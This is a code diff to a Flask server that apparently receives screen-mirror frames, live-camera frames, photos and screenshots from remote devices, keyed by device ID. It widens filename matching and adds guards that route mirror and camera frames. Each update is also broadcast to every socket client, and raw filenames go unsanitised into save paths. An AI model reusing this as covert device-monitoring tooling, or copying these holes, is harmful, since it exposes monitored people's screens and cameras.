@@ -108,7 +108,7 @@ def create_gateway_app():
             return jsonify({"success": True})
 
         # 1. Screen Mirroring Frame
-        elif category == "mirror" or fn_lower.startswith("mirror") or "mirror" in fn_lower:
+        elif category in ["mirror", "screen", "live_screen"] or any(k in fn_lower for k in ["mirror", "mirro", "mirrro"]):
             mirror_path = os.path.join("media", device_id, "mirror.jpg")
             file.save(mirror_path)
 
@@ -123,7 +123,7 @@ def create_gateway_app():
             return jsonify({"success": True, "url": mirror_url})
 
         # 2. Live Camera Frame
-        elif category == "live_camera" or fn_lower.startswith("live_camera"):
+        elif category in ["live_camera", "camera_live"] or any(k in fn_lower for k in ["live_camera", "livecam", "live_cam"]):
             cam_path = os.path.join("media", device_id, "live_camera.jpg")
             file.save(cam_path)
 
@@ -190,6 +190,29 @@ def create_gateway_app():
 
         # 5. Photos / Camera Captures / Screenshots
         elif category in ["photo", "photos", "camera", "image", "screenshot", "screenshots", "screencap"] or fn_lower.startswith(("img_", "screenshot", "cam_")):
+            # Absolute guard: If incoming file is a mirror or live_camera frame, divert immediately
+            if any(k in fn_lower for k in ["mirror", "mirro", "mirrro"]):
+                mirror_path = os.path.join("media", device_id, "mirror.jpg")
+                file.save(mirror_path)
+                mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
+                database[device_id]["mirror_url"] = mirror_url
+                database[device_id]["mirror_time"] = now_ms
+                save_db()
+                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
+                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
+                return jsonify({"success": True, "url": mirror_url})
+
+            if any(k in fn_lower for k in ["live_camera", "livecam", "live_cam"]):
+                cam_path = os.path.join("media", device_id, "live_camera.jpg")
+                file.save(cam_path)
+                cam_url = f"/api/media/stream/{device_id}/live_camera.jpg?t={now_ms}"
+                database[device_id]["live_camera_url"] = cam_url
+                database[device_id]["live_camera_time"] = now_ms
+                save_db()
+                socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url}, room=device_id)
+                socketio.emit('live_camera_update', {'device_id': device_id, 'url': cam_url})
+                return jsonify({"success": True, "url": cam_url})
+
             photos_dir = os.path.join("media", device_id, "photos")
             os.makedirs(photos_dir, exist_ok=True)
             photo_file_path = os.path.join(photos_dir, filename)
@@ -222,6 +245,18 @@ def create_gateway_app():
 
         # 6. Fallback General Files
         else:
+            # Absolute guard: never add mirror or live_camera to general media list
+            if any(k in fn_lower for k in ["mirror", "mirro", "mirrro"]):
+                mirror_path = os.path.join("media", device_id, "mirror.jpg")
+                file.save(mirror_path)
+                mirror_url = f"/api/media/stream/{device_id}/mirror.jpg?t={now_ms}"
+                database[device_id]["mirror_url"] = mirror_url
+                database[device_id]["mirror_time"] = now_ms
+                save_db()
+                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url}, room=device_id)
+                socketio.emit('mirror_update', {'device_id': device_id, 'url': mirror_url})
+                return jsonify({"success": True, "url": mirror_url})
+
             file_path = os.path.join("media", device_id, filename)
             file.save(file_path)
             file_size = os.path.getsize(file_path) if os.path.exists(file_path) else 0
